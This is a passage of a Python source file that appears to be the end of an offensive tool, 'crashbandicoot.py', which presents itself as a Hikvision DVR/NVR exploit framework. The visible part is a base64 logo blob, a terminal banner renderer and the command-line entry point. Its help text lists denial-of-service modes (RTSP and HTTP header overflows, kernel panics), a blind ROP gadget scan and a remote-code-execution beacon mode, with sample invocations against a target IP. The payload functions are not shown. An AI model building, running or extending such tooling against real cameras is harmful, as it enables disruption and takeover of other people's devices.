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"

def _render_logo() -> str:
    """Render logo to terminal. Uses ▀ half-blocks for correct 1:1 pixel aspect ratio.
    Scales automatically to terminal width. Falls back to ASCII if Pillow missing."""
    import shutil
    term_w = shutil.get_terminal_size((80, 24)).columns

    # ▀ half-block: 1 pixel = 1 column wide, 0.5 row tall
    # For a square image: H_rows = W/2 → correct square pixels at 8×16 cell ratio
    W    = min(term_w - 2, 100)
    H_px = W                          # square image → W pixels tall
    if H_px % 2: H_px += 1           # must be even for ▀ pairs

    try:
        from PIL import Image, ImageEnhance
        import base64, io

        img  = Image.open(io.BytesIO(base64.b64decode(_LOGO_B64))).convert("RGBA")
        bg   = Image.new("RGBA", img.size, (0, 0, 0, 255))
        bg.paste(img, mask=img.split()[3])
        gray = ImageEnhance.Contrast(bg.convert("L")).enhance(2.6)
        gray = gray.resize((W, H_px), Image.LANCZOS)

        R     = "\033[0m"
        lines = []
        for y in range(0, H_px, 2):
            row    = ""
            pfg = pbg = -1
            for x in range(W):
                top = gray.getpixel((x, y))
                bot = gray.getpixel((x, y + 1))
                tc  = 232 + int(top / 255 * 23) if top >= 10 else 232
                bc  = 232 + int(bot  / 255 * 23) if bot  >= 10 else 232
                t_v = top >= 10
                b_v = bot  >= 10

                if not t_v and not b_v:
                    if pfg != -2: row += R; pfg = pbg = -2
                    row += " "
                else:
                    esc = ""
                    if not t_v:                   # only bottom filled → ▄ on black
                        nc_fg, nc_bg = bc, 232
                        char = "▄"
                    elif not b_v:                 # only top filled → ▀ on black
                        nc_fg, nc_bg = tc, 232
                        char = "▀"
                    else:                         # both → ▀ fg=top bg=bottom
                        nc_fg, nc_bg = tc, bc
                        char = "▀"
                    if nc_fg != pfg: esc += f"\033[38;5;{nc_fg}m"; pfg = nc_fg
                    if nc_bg != pbg: esc += f"\033[48;5;{nc_bg}m"; pbg = nc_bg
                    row += esc + char
            row += R
            lines.append(row)
        art = "\n".join(lines)

    except Exception:
        art = (
            "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗██████╗ \n"
            " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║██╔══██╗\n"
            " ██║     ██████╔╝███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║██║  ██║\n"
            " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║██║  ██║\n"
            " ╚██████╗██║  ██║██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║██████╔╝\n"
            "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝"
        )

    R40 = "\033[38;5;240m"
    R25 = "\033[38;5;252m"
    R45 = "\033[38;5;245m"
    RST = "\033[0m"
    bar_inner = " ⊕  HIKVISION CAMERA TARGETING TOOL  ⊕ "
    bar_w = min(term_w - 4, len(bar_inner) + 4)
    line  = "─" * (bar_w + 2)
    sub = (
        f"\n{R40}  ┌{line}┐{RST}\n"
        f"  {R40}│{RST} {R45}⊕{RST}  {R25}HIKVISION CAMERA TARGETING TOOL{RST}  {R45}⊕{RST}  {R40}│{RST}\n"
        f"{R40}  └{line}┘{RST}"
    )
    return art + sub

BANNER = _render_logo




def main():
    print(BANNER())

    p = argparse.ArgumentParser(
        prog='crashbandicoot.py',
        description='Hikvision DVR/NVR exploit framework — all confirmed vectors',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  check           Liveness check + vulnerability summary
  dos-ua          RTSP User-Agent stack overflow    CVSS 9.8  ~2.5s restart
  dos-transport   RTSP Transport heap overflow      CVSS 7.5  ~9.7s restart
  dos-scale       RTSP Scale kernel panic           CVSS 8.1  >90s reboot
  dos-accept      RTSP Accept kernel panic          CVSS 8.1  >90s reboot
  dos-http        HTTP Host overflow + header flood CVSS 7.5
  all-dos         All DoS vectors sequentially
  scan-bxr0       Blind BX R0 gadget scan (RCE path via ret2reg)
  rce             Execute LOOP beacon via BX R0 gadget (needs --gadget)

Examples:
  python3 crashbandicoot.py -t █████████████ --mode check
  python3 crashbandicoot.py -t █████████████ --mode all-dos
  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0 --step 0x1001
  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0 --step 0x401 --start-idx 500
  python3 crashbandicoot.py -t █████████████ --mode rce --gadget 0x401234AB
        """
    )
    p.add_argument('-t', '--target',
                   required=True,
                   help='Target IP address of the Hikvision device')
    p.add_argument('-m', '--mode',
                   required=True, choices=MODES.keys(),
                   help='Exploit mode (see below)')
    p.add_argument('--gadget',
                   default=None,
                   help='BX R0 gadget address (hex) — required for --mode rce')
    p.add_argument('--step',
                   default='0x1001',
                   help='BX R0 scan step size in hex (default: 0x1001 = 4KB)')
    p.add_argument('--start-idx',
                   type=int, default=0, dest='start_idx',
                   help='Resume scan from candidate index N (default: 0)')
    p.add_argument('--rtsp-port',
                   type=int, default=RTSP_PORT, dest='rtsp_port',
                   help=f'RTSP port (default: {RTSP_PORT})')
    p.add_argument('--http-port',
                   type=int, default=HTTP_PORT, dest='http_port',
                   help=f'HTTP port (default: {HTTP_PORT})')

    args = p.parse_args()

    print(f"  Target : {args.target}  (RTSP:{args.rtsp_port}  HTTP:{args.http_port})")
    print(f"  Mode   : {args.mode}")
    if args.gadget:
        print(f"  Gadget : {args.gadget}")
    if args.mode == 'scan-bxr0':
        print(f"  Step   : {args.step}  |  Start-idx: {args.start_idx}")
    print()

    MODES[args.mode](args)
    print("\n[done]\n")


if __name__ == '__main__':
    main()
